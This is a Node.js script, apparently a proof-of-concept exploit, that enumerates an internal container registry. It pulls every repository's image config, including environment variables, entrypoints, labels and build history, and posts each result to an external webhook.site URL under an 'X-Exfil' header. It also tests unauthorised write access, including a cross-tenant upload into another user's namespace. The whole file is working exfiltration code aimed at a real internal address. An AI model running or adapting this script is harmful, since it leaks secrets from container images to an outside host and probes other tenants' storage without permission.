const https = require('https');
const http = require('http');
const fs = require('fs');

const WEBHOOK = "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f";
const PHASE = process.argv[2] || 'unknown';
const ZOT = 'http://10.244.1.56:5000';

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'text/plain', 'X-Exfil': label, 'X-Phase': PHASE }
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function httpGet(url) {
  return new Promise((resolve) => {
    http.get(url, { timeout: 10000 }, (res) => {
      let d = []; 
      res.on('data', c => d.push(c)); 
      res.on('end', () => {
        const buf = Buffer.concat(d);
        resolve({ status: res.statusCode, headers: res.headers, body: buf });
      });
    }).on('error', e => resolve({ status: 0, body: Buffer.from(e.message) }));
  });
}

async function main() {
  // 1. Get full catalog with tags
  const catalog = await httpGet(ZOT + '/v2/_catalog');
  const repos = JSON.parse(catalog.body.toString()).repositories || [];
  await post('catalog', JSON.stringify(repos));

  let allManifests = {};

  for (const repo of repos) {
    // Get tags
    const tagsRes = await httpGet(ZOT + '/v2/' + repo + '/tags/list');
    const tagsData = JSON.parse(tagsRes.body.toString());
    const tags = (tagsData.tags || []).filter(t => t !== 'buildcache');
    
    if (tags.length === 0) continue;

    // Get manifest for first non-buildcache tag
    const tag = tags[0];
    const manifestRes = await httpGet(ZOT + '/v2/' + repo + '/manifests/' + tag);
    let manifest;
    try {
      manifest = JSON.parse(manifestRes.body.toString());
    } catch(e) {
      await post('manifest-err-' + repo.replace(/\//g, '-'), manifestRes.body.toString().substring(0, 1000));
      continue;
    }

    allManifests[repo] = { tag, manifest };

    // If it's a manifest list, get the first platform
    if (manifest.manifests) {
      const first = manifest.manifests[0];
      if (first) {
        const platRes = await httpGet(ZOT + '/v2/' + repo + '/manifests/' + first.digest);
        try { manifest = JSON.parse(platRes.body.toString()); } catch(e) {}
      }
    }

    // Get config blob (contains env vars, cmd, entrypoint, etc.)
    if (manifest.config) {
      const configRes = await httpGet(ZOT + '/v2/' + repo + '/blobs/' + manifest.config.digest);
      try {
        const config = JSON.parse(configRes.body.toString());
        await post('config-' + repo.replace(/\//g, '-'), JSON.stringify({
          repo,
          tag,
          architecture: config.architecture,
          os: config.os,
          created: config.created,
          env: config.config?.Env,
          cmd: config.config?.Cmd,
          entrypoint: config.config?.Entrypoint,
          workingDir: config.config?.WorkingDir,
          exposedPorts: config.config?.ExposedPorts,
          labels: config.config?.Labels,
          user: config.config?.User,
          history: (config.history || []).map(h => h.created_by).slice(-10)
        }, null, 2));
      } catch(e) {
        await post('config-err-' + repo.replace(/\//g, '-'), configRes.body.toString().substring(0, 2000));
      }
    }

    // Try to check if we can push (HEAD request to check write access)
    // Don't actually push - just test
  }

  // 2. Test write access (initiate upload, then cancel)
  try {
    const uploadRes = await new Promise((resolve) => {
      const req = http.request(ZOT + '/v2/toni-bentini/rce-poc/exploit/blobs/uploads/', {
        method: 'POST', timeout: 5000
      }, (res) => {
        let d = ''; res.on('data', c => d += c);
        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: d }));
      });
      req.on('error', e => resolve({ status: 0, body: e.message }));
      req.end();
    });
    await post('write-test', JSON.stringify({ 
      status: uploadRes.status, 
      location: uploadRes.headers?.location,
      note: 'POST to initiate blob upload - tests write access'
    }));
  } catch(e) {
    await post('write-test', 'error: ' + e.message);
  }

  // 3. Try cross-tenant push test (to cblaettl namespace)
  try {
    const xpushRes = await new Promise((resolve) => {
      const req = http.request(ZOT + '/v2/cblaettl/epic-falcon/laravel/blobs/uploads/', {
        method: 'POST', timeout: 5000
      }, (res) => {
        let d = ''; res.on('data', c => d += c);
        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: d }));
      });
      req.on('error', e => resolve({ status: 0, body: e.message }));
      req.end();
    });
    await post('cross-tenant-push-test', JSON.stringify({
      status: xpushRes.status,
      location: xpushRes.headers?.location,
      note: 'POST to cblaettl namespace - tests cross-tenant write'
    }));
  } catch(e) {
    await post('cross-tenant-push-test', 'error: ' + e.message);
  }

  console.log('Registry exfil complete');
}

main().catch(console.error);
